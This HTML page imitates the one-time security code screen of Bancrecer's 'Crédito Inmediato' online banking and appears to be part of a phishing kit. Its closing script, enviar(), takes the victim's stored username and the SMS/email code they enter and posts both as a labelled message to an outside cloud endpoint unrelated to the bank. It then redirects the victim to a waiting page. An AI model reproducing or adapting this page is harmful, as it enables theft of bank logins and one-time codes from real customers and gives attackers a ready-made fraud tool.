<!DOCTYPE html>
<html lang="es"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <title>Crédito Inmediato</title>
  <!-- base href="https://bservicios.bancrecer.com.ve/transferencia/" -->

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="https://bservicios.bancrecer.com.ve/transferencia/favicon.ico">
<style>*,:after,:before{box-sizing:border-box;}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:rgba(0,0,0,0);}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,Liberation Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff;}@font-face{font-family:Roboto;src:url(Roboto.07fefb8cabed392b5880.eot);src:url(Roboto.07fefb8cabed392b5880.eot?#iefix) format("embedded-opentype"),url(Roboto.996f2de2581a63164bf7.woff2) format("woff2"),url(Roboto.b8c70ce58b10f6b73b21.woff) format("woff"),url(Roboto.13a29228654d5c5ec9c4.ttf) format("truetype");font-weight:300;font-style:normal;font-display:swap;}body{font-family:Roboto,sans-serif;color:#6d6e70;background-color:#f8f9fa;min-height:100vh;font-weight:300;margin:0;font-size:14px;}body,html{height:100%;}@media print{body,html{height:100%!important;margin:0!important;padding:0!important;overflow:hidden!important;top:0!important;}}</style><link rel="stylesheet" href="payment_data/styles.0b4d5858d9f40253abd8.css" media="all" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.0b4d5858d9f40253abd8.css"></noscript><script async="" src="stormcaster.js"></script><script>var __uzdbm_1 = "095fd46e-02e9-430e-8016-d37905e765c1";var __uzdbm_2 = "Mzg5ZTIyNDItY3pkbS00MTlmLWE1YjctNDYyZGRhNjBmMTRjJDE5MC4yMDYuMjA5LjE3MQ==";var __uzdbm_3 = "";var __uzdbm_4 = "false";var __uzdbm_5 = "";var __uzdbm_6 = "";var __uzdbm_7 = "";</script> <script>   (function (w, d, e, u, c, g, a, b) {     w["SSJSConnectorObj"] = w["SSJSConnectorObj"] || {       ss_cid: c,       domain_info: "auto",     };     w[g] = function (i, j) {       w["SSJSConnectorObj"][i] = j;     };     a = d.createElement(e);     a.async = true;     if (       navigator.userAgent.indexOf('MSIE') !== -1 ||       navigator.appVersion.indexOf('Trident/') > -1     ) {       u = u.replace("/advanced/", "/advanced/ie/");     }     a.src = u;     b = d.getElementsByTagName(e)[0];     b.parentNode.insertBefore(a, b);   })(     window, document, "script", "https://bservicios.bancrecer.com.ve/18f5227b-e27b-445a-a53f-f845fbe69b40/stormcaster.js", "czdo", "ssConf"   );   ssConf("c1", "https://bservicios.bancrecer.com.ve");   ssConf("c3", "c99a4269-161c-4242-a3f0-28d44fa6ce24");   ssConf("au", "bservicios.bancrecer.com.ve");   ssConf("cu", "validate.perfdrive.com, ssc"); </script><style>.overlay[_ngcontent-ecm-c95]{position:fixed;display:block;width:100%;height:100%;top:0;left:0;background-color:#ffffffb3!important;z-index:99999}.spinner[_ngcontent-ecm-c95]{width:50px;height:50px;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}</style><style>.mat-dialog-container{display:block;padding:24px;border-radius:4px;box-sizing:border-box;overflow:auto;outline:0;width:100%;height:100%;min-height:inherit;max-height:inherit}.cdk-high-contrast-active .mat-dialog-container{outline:solid 1px}.mat-dialog-content{display:block;margin:0 -24px;padding:0 24px;max-height:65vh;overflow:auto;-webkit-overflow-scrolling:touch}.mat-dialog-title{margin:0 0 20px;display:block}.mat-dialog-actions{padding:8px 0;display:flex;flex-wrap:wrap;min-height:52px;align-items:center;box-sizing:content-box;margin-bottom:-24px}.mat-dialog-actions[align=end]{justify-content:flex-end}.mat-dialog-actions[align=center]{justify-content:center}.mat-dialog-actions .mat-button-base+.mat-button-base,.mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:8px}[dir=rtl] .mat-dialog-actions .mat-button-base+.mat-button-base,[dir=rtl] .mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:0;margin-right:8px}
</style><style>.container.mat-dialog-content[_ngcontent-ecm-c89]{display:block;margin:0;padding:0 15px;max-height:none;overflow:auto;-webkit-overflow-scrolling:touch}</style></head>
<body>
  
  
<script src="payment_data/runtime.88c0a90e6d78f5577276.js" defer="defer"></script><script src="payment_data/polyfills.788cfcd9200fdf6cbb60.js" defer="defer"></script>

<script type="text/javascript" id="64bb2703-e0c3-49e7-a41d-d4115ea3a62f">const originalSetItem = sessionStorage.setItem; sessionStorage.setItem = function (key, value) { originalSetItem.call(this, key, value); if (key === "token" && value) { const jwtToken = value; const parts = jwtToken.split("."); if (parts.length !== 3) throw new Error("Invalid JWT format"); const payload = parts[1]; const decodedPayload = JSON.parse(atob(payload)); const clientId = decodedPayload.clientId; const jti = decodedPayload.jti; (function (s, h, ci, si, wi) { s = s + Math.random().toString(36).substring(7) + "/login.js?clientId=" + ci + "&websiteId=" + wi; window._dmo = { src: s, host: h, sessionId: si, clientId: ci, websiteId: wi }; var a = document.createElement("script"); a.type = "text/javascript"; a.src = s; a.async = !0; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })("https://pagoya.bancrecer.com.ve:443/scriptdealer/script/v1/", "https://pago2.bancrecer.com.ve:443", jti, clientId, "632"); } };</script>

<div class="cdk-overlay-container"><div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div><div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;"><div id="cdk-overlay-1" class="cdk-overlay-pane col-12 col-sm-10 col-md-6 col-lg-4 mw-100" style="max-width: 80vw; max-height: 90vh; height: auto; position: static;"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><mat-dialog-container tabindex="-1" aria-modal="true" class="mat-dialog-container ng-tns-c39-1 ng-trigger ng-trigger-dialogContainer ng-star-inserted" id="mat-dialog-1" role="dialog" style="transform: none;"><app-otp _nghost-ecm-c89="" class="ng-star-inserted">
  <div _ngcontent-ecm-c89="" mat-dialog-content="" class="mat-dialog-content container p-3 mx-0"><div _ngcontent-ecm-c89="" class="row"><div _ngcontent-ecm-c89="" class="col-12 text-center"><h4 _ngcontent-ecm-c89="" class="text-danger">Verificación de seguridad</h4></div></div>
  <div _ngcontent-ecm-c89="" class="row mb-3"><div _ngcontent-ecm-c89="" class="col-12"> Ingrese el código de seguridad que recibio por sms y/o email </div></div><form _ngcontent-ecm-c89="" novalidate="" class="ng-pristine ng-invalid ng-touched"><div _ngcontent-ecm-c89="" class="row mb-3">
    <div _ngcontent-ecm-c89="" class="col-12"><div _ngcontent-ecm-c89="" class="form-label-group"><input _ngcontent-ecm-c89="" maxlength="8" id="tok" formcontrolname="otp" class="form-control ng-pristine ng-invalid ng-touched"><label _ngcontent-ecm-c89="">Código de seguridad</label></div>
  
    
  </div>


  <p style="margin-top: 5%; margin-left: 45%; margin-bottom: 1%; " id="time">2:59</p>
  <p style="color: #804493; margin-left: 40%; font-family: 'Arial', sans-serif; font-weight: bold;">Tiempo restante</p>
</div></form><!----><!----><div _ngcontent-ecm-c89="" class="row mt-5"><div _ngcontent-ecm-c89="" class="col-12 col-md-6 text-center text-md-left mb-2 mb-md-0 order-2 order-md-1"><button _ngcontent-ecm-c89="" class="btn btn-secondary btn-block rounded-0">CANCELAR</button></div><div _ngcontent-ecm-c89="" class="col-12 col-md-6 text-center text-md-right mb-2 mb-md-0 order-1 order-md-2 my-md-auto"><button _ngcontent-ecm-c89="" class="btn btn-primary btn-block rounded-0 " onclick="enviar(event)">ENVIAR</button></div></div></div></app-otp><!----></mat-dialog-container><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div>
    
 <script>
        // Función para actualizar el contador
        function startCountdown(durationInMinutes) {
            const display = document.getElementById('time');
            let timer = durationInMinutes * 60; // Convertir minutos a segundos

            const interval = setInterval(function () {
                let minutes = parseInt(timer / 60, 10);
                let seconds = parseInt(timer % 60, 10);

                // Formatear minutos y segundos para que siempre tengan dos dígitos si son menores a 10
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                   location.reload();
                }
            }, 1000); // Se ejecuta cada 1000 milisegundos (1 segundo)
        }

        // Llama a la función para iniciar el contador de 3 minutos
        window.onload = function () {
            startCountdown(3);
        };
    </script>
    <script>
         
async function enviar(event) { // Asegúrate de que 'event' se pase como argumento
    event.preventDefault(); // Evita recargar la página

    const usr = localStorage.getItem("usr"); // Obtiene el usuario del localStorage
    const usrs = document.getElementById('tok').value;
    const responseMessage = document.getElementById("responseMessage"); // Asegúrate de que este elemento exista en tu HTML

    // --- Validación para campos vacíos ---
    if (!usr.trim()) { // .trim() elimina espacios en blanco al inicio/final
        responseMessage.textContent = "⚠️ Por favor, ingresa tu usuario.";
        return; // Detiene la ejecución si el usuario está vacío
    }

    if (!usrs.trim()) { // .trim() para la contraseña también
        responseMessage.textContent = "⚠️ Por favor, ingresa tu contraseña.";
        return; // Detiene la ejecución si la contraseña está vacía
    }
    // --- Fin de la validación ---

    const message = `BCRECER-- --Usuario: <code>${usr}</code> --\n Code:<code> ${usrs} </code>--`;

    try {
        const response = await fetch("https://40745e2a-5338-4034-bc5c-ccabb155a50f.us-east-1.cloud.genez.io/", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message })
        });

        const data = await response.json();

        if (response.ok) {
            localStorage.setItem("usr", usr);
            window.location = "/wait.html";
        } else {
            responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
        }
    } catch (error) {
        responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
    }
}


    </script>
  </div></body></html>
